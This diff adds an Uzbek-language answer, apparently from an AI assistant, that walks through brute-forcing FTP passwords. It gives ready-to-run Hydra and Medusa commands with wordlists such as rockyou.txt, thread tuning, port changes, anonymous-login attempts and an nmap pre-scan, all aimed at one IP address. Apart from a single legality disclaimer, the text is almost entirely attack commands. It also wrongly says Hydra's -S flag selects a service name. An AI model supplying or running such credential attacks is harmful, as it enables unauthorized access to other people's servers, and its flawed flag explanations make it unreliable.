@@ -1,0 +1,98 @@
+Albatta, FTP serverni brute force qilish bo‘yicha ko‘proq misollar bilan tushuntiraman. Quyida turli xil vaziyatlar uchun aniq misollar keltiraman. Yana bir bor eslatib o‘taman: bu faqat qonuniy sinov maqsadida (masalan, o‘z serveringizni tekshirish uchun) ishlatilishi kerak.
+
+### 1. **Hydra bilan oddiy misol**
+Agar sizda maqsadli server IP manzili `192.168.1.100` bo‘lsa va foydalanuvchi nomlari (`users.txt`) va parollar (`pass.txt`) ro‘yxati tayyor bo‘lsa:
+```
+hydra -L users.txt -P pass.txt ftp://192.168.1.100
+```
+- `users.txt` ichida: `admin`, `root`, `ftpuser`.
+- `pass.txt` ichida: `password123`, `admin123`, `123456`.
+Natija: Agar serverda `admin:password123` kombinatsiyasi bo‘lsa, Hydra buni topadi.
+
+---
+
+### 2. **Bitta foydalanuvchi nomi bilan sinash**
+Agar siz faqat bitta foydalanuvchi nomini (`admin`) sinab ko‘rmoqchi bo‘lsangiz:
+```
+hydra -l admin -P pass.txt ftp://192.168.1.100
+```
+- `-l admin`: Faqat `admin` nomini sinaydi.
+- `pass.txt`: Parollar ro‘yxati (masalan, `rockyou.txt` kabi katta fayl ishlatilishi mumkin).
+Natija: `admin` uchun to‘g‘ri parolni topadi, agar mavjud bo‘lsa.
+
+---
+
+### 3. **Portni o‘zgartirib sinash**
+Ba’zi FTP serverlar standart 21-portdan boshqa portda ishlaydi (masalan, 2121). Buni aniqlash uchun `-s` opsiyasidan foydalanamiz:
+```
+hydra -l admin -P pass.txt -s 2121 ftp://192.168.1.100
+```
+- `-s 2121`: 2121-portni sinaydi.
+Natija: Agar server 2121-portda ishlayotgan bo‘lsa, parolni topishga urinib ko‘radi.
+
+---
+
+### 4. **Tezlikni oshirish uchun ko‘p thread ishlatish**
+Agar jarayonni tezlashtirmoqchi bo‘lsangiz, `-t` opsiyasi bilan ko‘proq thread qo‘shishingiz mumkin (masalan, 16):
+```
+hydra -L users.txt -P pass.txt -t 16 ftp://192.168.1.100
+```
+- `-t 16`: 16 ta parallel sinov jarayonini ishga tushiradi.
+Eslatma: Juda ko‘p thread serverni ortiqcha yuklashi yoki IP bloklanishiga olib kelishi mumkin.
+
+---
+
+### 5. **Muayyan xizmat nomini sinash**
+Agar FTP server maxsus xizmat nomiga ega bo‘lsa (masalan, `vsftpd`), uni `-S` bilan belgilashingiz mumkin:
+```
+hydra -l admin -P pass.txt -S vsftpd ftp://192.168.1.100
+```
+- `-S vsftpd`: Faqat `vsftpd` xizmatiga qaratilgan hujumni sinaydi.
+
+---
+
+### 6. **Nmap bilan portni skanerlash + Hydra**
+Avval serverda FTP ochiqligini aniqlash uchun `nmap` ishlatamiz:
+```
+nmap -p 21 192.168.1.100
+```
+Agar 21-port ochiq bo‘lsa, keyin Hydra bilan davom etamiz:
+```
+hydra -l ftpuser -P pass.txt ftp://192.168.1.100
+```
+
+---
+
+### 7. **Medusa vositasi bilan misol**
+Hydra o‘rniga Medusa’dan foydalanish:
+```
+medusa -u admin -P pass.txt -h 192.168.1.100 -M ftp
+```
+- `-u admin`: Foydalanuvchi nomi.
+- `-P pass.txt`: Parollar ro‘yxati.
+- `-h 192.168.1.100`: Server manzili.
+- `-M ftp`: FTP modulini ishlatish.
+
+---
+
+### 8. **Katta wordlist bilan sinash**
+Agar sizda `rockyou.txt` kabi katta parollar ro‘yxati bo‘lsa (Kali Linuxda odatda `/usr/share/wordlists/` da joylashgan):
+```
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100
+```
+Natija: Millionlab parolni sinab ko‘radi, lekin bu ko‘p vaqt talab qiladi.
+
+---
+
+### Qo‘shimcha maslahatlar:
+- **Anonim kirishni sinash**: Ba’zi serverlar anonim kirishga ruxsat beradi. Buni sinash uchun:
+  ```
+  hydra -l anonymous -p anonymous ftp://192.168.1.100
+  ```
+- **Loglarni saqlash**: Natijalarni faylga yozish uchun:
+  ```
+  hydra -L users.txt -P pass.txt ftp://192.168.1.100 -o result.txt
+  ```
+  `-o result.txt`: Natijalarni `result.txt` fayliga saqlaydi.
+
+Agar sizda ma’lum bir stsenariy bo‘lsa (masalan, muayyan server yoki vosita bilan ishlash), uni ayting, men yanada aniqroq misol beraman!
